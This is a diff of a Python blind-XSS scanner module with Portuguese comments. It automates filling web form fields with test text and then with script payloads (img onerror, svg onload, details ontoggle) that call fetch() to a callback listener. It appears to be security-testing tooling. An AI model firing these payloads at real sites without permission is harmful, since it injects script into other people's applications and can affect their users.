@@ -1,6 +1,25 @@
+"""
+XSS Scanner Module
+
+Este módulo detecta vulnerabilidades de Cross-Site Scripting (XSS),
+com foco em Blind XSS.
+
+Funcionalidades:
+- Injeção de payloads em formulários
+- Monitoramento de callbacks via servidor HTTP
+- Suporte a múltiplos tipos de payload
+
+Limitações:
+- Requer CallbackServer rodando
+- Payloads podem ser bloqueados por sanitização/WAF
+- Falso positivos possíveis
+
+Exemplo de Uso:
+    # Integrado ao orquestrador ou executado manualmente
+"""
+
 from playwright.sync_api import Page, Browser, TimeoutError as PlaywrightTimeoutError
 from typing import Any
-from ...Recon.web_crawler import page_reload
 from ..CallbackServer.xss_http_server import registrar_payload_injetado
 
 class XSSScanner:
@@ -21,22 +40,23 @@ class XSSScanner:
         self.page = page
         self.browser = browser
         self.url_ouvinte = url_ouvinte
+        self.original_url = url_original
         self.url_original = url_original
         self.playwright_instance = playwright_instance
         self.injected_payloads = []
         self.campos_validos = []
 
-    def _build_payloads(self, payload_id=None):
+    def _build_payloads(self, payload_id):
         """Cria uma lista de payloads blind xss com o link do servidor ouvinte."""
         payloads = []
-        url_with_id = f"{self.url_ouvinte}?id={payload_id}" if payload_id else self.url_ouvinte
+        url_with_id = f"{self.url_ouvinte}?id={payload_id}"
         payloads_models = [
-            "<img src=x onerror=fetch('{url_ouvinte}')>",
-            "<svg onload=fetch('{url_ouvinte}')>",
-            "<details open ontoggle=fetch('{url_ouvinte}')>",
+            f"<img src=x onerror=fetch('{url_with_id}')>",
+            f"<svg onload=fetch('{url_with_id}')>",
+            f"<details open ontoggle=fetch('{url_with_id}')>",
         ]
         for model in payloads_models:
-            payloads.append(model.format(url_ouvinte=url_with_id))
+            payloads.append(model)
         return payloads
 
     def _get_payload_types(self):
@@ -47,101 +67,72 @@ class XSSScanner:
         """Verifica se o texto enviado foi processado corretamente."""
         try:
             self.page.wait_for_load_state("domcontentloaded", timeout=10000)
+            # Verifica no corpo, em atributos de input e em textareas
             body_text = self.page.locator("body").inner_text()
             if eco_text in body_text:
                 return True
+            
+            input_values = self.page.locator("input[type=text], input[type=search]").all()
+            for input_value in input_values:
+                if eco_text in input_value.input_value():
+                    return True
+            
+            textarea_values = self.page.locator("textarea").all()
+            for textarea_value in textarea_values:
+                if eco_text in textarea_value.input_value():
+                    return True
+
             return False
         except Exception as e:
             print(f"An error occurred during verification: {e}")
             return False
 
-    def _activate_mat_input_field(self, field_id="mat-input-1"):
-        """Ativa especificamente o campo mat-input-1 (barra de pesquisa)
-        usando Playwright"""
-        try:
-            input_field = self.page.locator(f"#{field_id}")
-            if input_field.is_visible() and input_field.is_editable():
-                input_field.focus()
-                return input_field
-            if input_field.is_visible():
-                input_field.focus()
-                input_field.click()
-                self.page.wait_for_timeout(500)
-                if input_field.is_editable():
-                    return input_field
-            search_selectors = [
-                "mat-icon.mat-search_icon-search",
-                ".mat-search_icons mat-icon:has-text('search')",
-                "span.mat-search_icons mat-icon[class*='search']",
-            ]
-            for selector in search_selectors:
-                try:
-                    search_icon = self.page.locator(selector).first
-                    if search_icon.count() > 0:
-                        search_icon.click(timeout=3000)
-                        print(f"Ícone de busca clicado com seletor: {selector}")
-                        input_field.wait_for(state="visible", timeout=5000)
-                        input_field.focus()
-                        input_field.click()
-                        self.page.wait_for_timeout(500)
-                        if input_field.is_editable():
-                            return input_field
-                        else:
-                            self.page.wait_for_timeout(1000)
-                            if input_field.is_editable():
-                                return input_field
-                except PlaywrightTimeoutError:
-                    continue
-            print(f"Não foi possível ativar o campo {field_id}")
-            return None
-        except Exception as e:
-            print(f"Erro ao ativar campo {field_id}: {e}")
-            return None
+
 
     def _find_field_element(self, element):
         """Encontra um elemento de campo usando diferentes
         estratégias com Playwright"""
         input_field = None
-        if element["id"]:
-            try:
-                input_field = self.page.locator(f"#{element['id']}")
-                input_field.click(timeout=5000)
-                input_field.wait_for(state="visible", timeout=5000)
-                return input_field
-            except PlaywrightTimeoutError:
-                input_field = None
-        if not input_field and element["name"]:
-            try:
-                input_field = self.page.locator(f"[name='{element['name']}']")
-                input_field.click(timeout=5000)
-                input_field.wait_for(state="visible", timeout=5000)
-                return input_field
-            except PlaywrightTimeoutError:
-                input_field = None
-        return input_field
+        selectors = [
+            f"#{element['id']}" if element.get('id') else None,
+            f"[name='{element['name']}']" if element.get('name') else None,
+            "input[type=text]",
+            "input[type=search]",
+            "textarea",
+        ]
+        for selector in selectors:
+            if selector:
+                try:
+                    input_field = self.page.locator(selector).first
+                    if input_field.is_visible():
+                        element['id'] = input_field.get_attribute('id')
+                        element['name'] = input_field.get_attribute('name')
+                        return input_field
+                except PlaywrightTimeoutError:
+                    continue
+        return None
 
     def _submit_form(self, input_field):
         """Submete o formulário usando diferentes estratégias com Playwright"""
         try:
-            submit_button = self.page.locator("button[type='submit']").first
+            # Tenta encontrar o formulário associado ao campo de input
+            form = input_field.locator("xpath=ancestor::form").first
+            if form:
+                form.evaluate('form => form.submit()')
+                return
+        except Exception:
+            pass
+
+        try:
+            # Se não encontrar o formulário, tenta clicar em um botão de submit
+            submit_button = self.page.locator("button[type='submit'], input[type='submit']").first
             submit_button.click(timeout=3000)
             return
         except PlaywrightTimeoutError:
             pass
+
         try:
-            login_button = self.page.locator("button:has-text('Log in')").first
-            login_button.click(timeout=3000)
-            return
-        except PlaywrightTimeoutError:
-            pass
-        try:
-            login_btn = self.page.locator("#loginButton")
-            if login_btn.count() > 0:
-                login_btn.click(timeout=3000)
-                return
-        except PlaywrightTimeoutError:
-            pass
-        try:
+            # Como último recurso, pressiona Enter
             input_field.press("Enter")
         except Exception:
             pass
@@ -181,33 +172,13 @@ class XSSScanner:
         results = []
         for element in lista:
             try:
-                input_field = None
-                if element.get("type") in ["checkbox", "radio", "submit", "button"]:
-                    continue
-                if element.get("id") == "mat-input-1":
-                    input_field = self._activate_mat_input_field("mat-input-1")
-                    if not input_field:
-                        results.append(
-                            {
-                                "element": element,
-                                "status": "failed",
-                                "error": "Campo de busca mat-input-1 não pode ser ativado",
-                            }
-                        )
-                        continue
-                else:
-                    input_field = self._find_field_element(element)
+                input_field = self._find_field_element(element)
                 if input_field:
                     input_field.clear()
                     input_field.fill(test_text)
                     self._submit_form(input_field)
                     self.page.wait_for_timeout(2000)
-                    current_url = self.page.url
-                    eco_result = False
-                    if current_url != self.original_url:
-                        eco_result = self._eco_verificator(test_text)
-                    else:
-                        eco_result = self._eco_verificator(test_text)
+                    eco_result = self._eco_verificator(test_text)
                     results.append(
                         {
                             "element": element,
@@ -232,37 +203,20 @@ class XSSScanner:
                 payload_types = self._get_payload_types()
                 for payload_type in payload_types:
                     try:
-                        print(f"Recarregando página para payload {payload_type} no campo {field_name}")
-                        self.page, self.browser = page_reload(
-                            self.page, self.browser, self.url_original, self.playwright_instance
-                        )
-                        if not self.page:
-                            print("Falha ao recarregar a página")
+                        self.page.reload()
+                        input_field = self._find_field_element(element)
+                        if not input_field:
+                            print(f"Não foi possível encontrar o campo {field_name}")
                             continue
+
                         payload_id = registrar_payload_injetado(
                             campo_id=field_id,
                             campo_name=field_name,
                             payload=f"payload_{payload_type}",
                             url_origem=self.url_original,
                         )
-                        payloads = self._build_payloads(payload_id)
-                        payload = (
-                            payloads[0]
-                            if payload_type == "img"
-                            else payloads[1]
-                            if payload_type == "svg"
-                            else payloads[2]
-                        )
-                        if element.get("id") == "mat-input-1":
-                            input_field = self._activate_mat_input_field("mat-input-1")
-                            if not input_field:
-                                print("Campo de busca mat-input-1 não pode ser ativado")
-                                continue
-                        else:
-                            input_field = self._find_field_element(element)
-                        if not input_field:
-                            print(f"Não foi possível encontrar o campo {field_name}")
-                            continue
+                        payload = self._build_payloads(payload_id)[payload_types.index(payload_type)]
+
                         input_field.clear()
                         input_field.fill(payload)
                         self._submit_form(input_field)
